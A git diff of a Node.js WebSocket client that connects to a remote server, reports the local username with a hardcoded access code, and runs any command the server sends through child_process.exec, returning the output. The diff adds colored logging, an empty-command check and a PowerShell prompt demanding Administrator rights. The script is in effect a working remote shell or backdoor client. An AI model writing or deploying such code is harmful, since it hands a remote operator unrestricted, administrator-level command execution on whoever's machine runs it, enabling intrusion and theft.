@@ -1,3 +1,5 @@
+const nw = require('node-windows');
+const clc = require("cli-color");
 const { exec } = require('child_process');
 var WebSocket = require('ws');
 
@@ -9,29 +11,31 @@ const connect = () => {
   var ws = new WebSocket(serverAddress);
   ws.on('open', () => {
       console.log("> Websocket connection established.")
-      console.log("> Connected to:", serverAddress)
+      console.log("> Connected to:", clc.cyan(serverAddress))
       ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username, accessCode: "tvojemama" }))
   });
   ws.on('message', function(msg) {
-    console.log("Received >", msg.toString())
+    //console.log("Received >", Buffer.from(msg.toString("utf8", 0, 25)).slice(0, -1))
+    console.log(clc.blackBright("Received >"), msg)
     msg = JSON.parse(msg.toString())
     console.log("Parsed >", msg)
     switch(msg.type){
       case "msg":
-        console.log("Message >", msg.value)
+        console.log(clc.bold("Message >", msg.value))
         break;
       case "exec":
+        if(!msg.value) return ws.send(JSON.stringify({ type: "cmd", value: "no cmd", to: "web" }))
         exec(msg.value, (error, stdout, stderr) => {
-          console.log('> Transmitting output..');
+          console.log(clc.bold('> Transmitting output..'));
           if (error) {
-              console.log('> Transmission successfull.');
+              console.log(clc.bold('> Transmission successfull.'));
               return ws.send(JSON.stringify({ type: "cmd", value: error.message, to: "web" }))
           }
           if (stderr) {
-              console.log('> Transmission successfull.');
+              console.log(clc.bold('> Transmission successfull.'));
               return ws.send(JSON.stringify({ type: "cmd", value: stderr, to: "web" }))
           }
-          console.log('> Transmission successfull.');
+          console.log(clc.bold('> Transmission successfull.'));
           return ws.send(JSON.stringify({ type: "cmd", value: stdout, to: "web" }))
         })
         break;
@@ -39,7 +43,7 @@ const connect = () => {
   });
 
   ws.on("upgrade", (data) => {
-    console.log("> Protocol upgraded from HTTP to WSS.", data.statusCode)
+    console.log("> Protocol upgraded from", clc.whiteBright("HTTP"), "to", clc.whiteBright("WSS."), data.statusCode)
   })
   ws.on("close", (data) => {
     console.log("> Connection closed.", data)
@@ -50,4 +54,15 @@ const connect = () => {
     console.log("ERROR", err)
   })
 }
-connect()
+nw.isAdminUser(e => {
+  if(e) return connect()
+  exec(`PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Please run the program as an Administrator.', 'Error', 0, 16)"`, (error, stdout, stderr) => {
+          if (error) {
+              return console.log(error);
+          }
+          if (stderr) {
+            return console.log(stderr);
+          }
+          return process.exit(0)
+  })
+})
